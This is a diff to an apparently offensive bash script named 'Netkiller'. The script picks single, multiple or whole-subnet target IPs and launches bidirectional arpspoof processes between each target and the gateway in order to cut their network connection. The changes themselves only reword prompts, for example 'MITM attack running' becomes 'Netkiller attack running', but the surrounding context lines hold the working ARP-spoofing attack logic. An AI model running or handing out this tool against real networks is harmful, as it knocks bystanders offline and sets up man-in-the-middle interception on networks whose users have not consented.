@@ -31,51 +31,53 @@ echo ""
 # Detect Gateway IP
 GW=$(ip route show dev "$INTERFACE" | awk '/default/ {print $3}')
 echo "Enter Router Gateway IP: Enter by default"
-read -p "> $GW" INET
+read -p "> $GW " INET
 GATEWAY="${INET:-$GW}"
 echo ""
 
 # Detect CIDR
 CIDR=$(ip addr show "$INTERFACE" | grep 'inet ' | awk '{print $2}')
 echo "Enter Subnet Mask: Enter by default"
-read -p "> $CIDR" SUB
+read -p "> $CIDR " SUB
 NETWORK_CIDR="${SUB:-$CIDR}"
 echo ""
 
 # Detect Device IP
 echo "Enter Device IP: Enter by default"
 IP=$(ip addr show "$INTERFACE" | awk '/inet / {print $2}' | cut -d/ -f1)
-read -p "> $IP" DEVIP
+read -p "> $IP " DEVIP
 MYIP="${DEVIP:-$IP}"
 echo " "
 
-echo "Network Interface: $INTERFACE"
-echo "Gateway IP: $GATEWAY"
-echo "Subnet IP: $CIDR"
-echo "Your IP: $MYIP"
+echo "Current Network Configurations"
+echo "[*] Network Interface: $INTERFACE"
+echo "[*] Gateway IP: $GATEWAY"
+echo "[*] Subnet IP: $CIDR"
+echo "[*] Your IP: $MYIP"
 echo " "
 
 # Target selection
-echo "Select target type:"
+echo "Select Attack type:"
 echo "1) Single target IP"
-echo "2) Multiple target IPs (comma separated)"
-echo "3) Target all IP's (subnet mask)"
+echo "2) Multiple target IP's (comma separated)"
+echo "3) Target all IP's in Subnet"
 echo ""
 read -p "Enter choice [1-3]: " target_type
 echo ""
+
 case $target_type in
     1)
-        echo "Enter target IP: e.g 192.168.1.123"
+        echo "Enter Single target IP: e.g 192.168.1.123"
         read -p "> " TARGET
         TARGETS=($TARGET)
         ;;
     2)
-        echo "Enter Multiple IP's: e.g 192.168.1.123,192.168.1.124"
+        echo "Enter Multiple target IP's: e.g 192.168.1.123,192.168.1.124..."
         read -p "> " target_input
         IFS=',' read -ra TARGETS <<< "$target_input"
         ;;
     3)
-        echo "Enter Subnet Mask: e.g 192.168.1.1/24"
+        echo "Target all IP's in Subnet: e.g 192.168.1.1/24"
         read -p "> " subnet
 
         # Validate subnet
@@ -122,7 +124,7 @@ case $target_type in
 
         # Option to exempt additional IPs
         echo ""
-        read -p "Do you want to exempt any additional IPs from the subnet? (y/n) " exempt_choice
+        read -p "Do you want to exempt any additional IP's from the subnet? (y/n) " exempt_choice
         if [[ "$exempt_choice" =~ ^[Yy]$ ]]; then
             echo ""
             echo "Enter IP's to exempt: e.g 192.168.1.110,192.168.1.120"
@@ -142,7 +144,6 @@ case $target_type in
                 [[ -z $skip ]] && NEW_TARGETS+=("$target")
             done
             TARGETS=("${NEW_TARGETS[@]}")
-
             echo ""
             echo "Updated targets after exemption: ${#TARGETS[@]} remaining"
         fi
@@ -159,7 +160,7 @@ if [ ${#TARGETS[@]} -eq 0 ]; then
 fi
 
 # Confirm before proceeding
-echo -e "\nNumber of targets to affect: ${#TARGETS[@]}"
+echo -e "\nNumber of targets IP's to affect: ${#TARGETS[@]}"
 echo ""
 read -p "Are you sure you want to continue? (y/n) " confirm
 if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
@@ -171,7 +172,7 @@ fi
 PIDS=()
 for TARGET in "${TARGETS[@]}"; do
     echo ""
-    echo "Starting ARP spoofing for $TARGET"
+    echo "Netkiller kills the connection for $TARGET"
     arpspoof -i $INTERFACE -t $TARGET $GATEWAY >/dev/null 2>&1 &
     PIDS+=($!)
     arpspoof -i $INTERFACE -t $GATEWAY $TARGET >/dev/null 2>&1 &
@@ -205,7 +206,7 @@ cleanup() {
 # Trap Ctrl+C
 trap cleanup EXIT
 
-echo -e "\nMITM attack running. Press Ctrl+C to stop..."
+echo -e "\nNetkiller attack running. Press Ctrl+C to stop..."
 while true; do
     sleep 1
 done
